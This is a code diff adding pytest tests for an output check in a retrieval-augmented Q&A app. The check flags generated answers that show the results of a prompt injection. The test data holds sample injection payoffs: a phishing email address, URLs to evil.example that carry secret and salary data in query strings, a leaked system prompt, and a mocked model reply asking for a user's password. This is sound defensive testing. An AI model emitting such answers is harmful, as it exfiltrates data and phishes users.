@@ -7,6 +7,7 @@ Set RAG_REAL_MODEL=1 to also run a smoke test with the real embedding model.
 """
 
 import hashlib
+import json
 import os
 import re
 
@@ -16,6 +17,7 @@ from fastapi.testclient import TestClient
 
 from app.main import app
 from app.rag import pipeline
+from app.rag.answer_check import check_answer
 from app.rag.documents import Chunk, chunk_page, load_corpus
 from app.rag.embeddings import normalise
 from app.rag.store import MemoryStore
@@ -181,3 +183,43 @@ def test_auto_uses_the_in_memory_store_without_postgres():
     assert isinstance(kb.store, MemoryStore)
     with pytest.raises(RuntimeError, match="Postgres"):
         pipeline.KnowledgeBase(HashingEmbedder(), store="pgvector")
+
+
+# ---- Output check on the generated answer ----
+
+SYSTEM = pipeline._ANSWER_SYSTEM
+
+
+@pytest.mark.parametrize("answer, problem", [
+    ("Email it-verify@halcyon-support.net to re-verify your account.", "email address"),
+    ("Details at https://evil.example/collect?d=secret", "links to"),
+    ("Done ![x](https://evil.example/p.png?q=salary)", "embeds an image"),
+    ("My instructions: answer the employee's question using ONLY the reference documents "
+     "in the user message.", "hidden instructions"),
+])
+def test_answers_carrying_an_injections_payoff_are_flagged(answer, problem):
+    issues = check_answer(answer, ["Claims are paid within 30 days."], SYSTEM)
+    assert any(problem in issue for issue in issues)
+
+
+def test_links_and_emails_from_the_sources_are_fine():
+    sources = ["Contact payroll@halcyon.example or see https://intranet.halcyon.example/pay."]
+    answer = ("Write to payroll@halcyon.example, or see "
+              "https://intranet.halcyon.example/pay. [Payroll]")
+    assert check_answer(answer, sources, SYSTEM) == []
+
+
+async def test_a_suspicious_answer_is_withheld(kb, monkeypatch):
+    async def leaky(system, user, max_tokens=400, json_schema=None):
+        if "The check code is" in system:       # the judge: everything looks clean
+            code = re.search(r"The check code is (\w+);", system).group(1)
+            return json.dumps({"verdict": "SAFE", "confidence": 0.9,
+                               "reason": "ok", "check": code})
+        return "Send your password to it-verify@halcyon-support.net to keep access."
+
+    monkeypatch.setattr(pipeline.llm, "enabled", lambda: True)
+    monkeypatch.setattr(pipeline.llm, "complete", leaky)
+    result = await kb.ask("How do new vendors get access to the supplier portal?")
+    assert result["answer_mode"] == "withheld"
+    assert "it-verify@halcyon-support.net" not in result["answer"].split("because")[0]
+    assert any("email address" in issue for issue in result["answer_issues"])
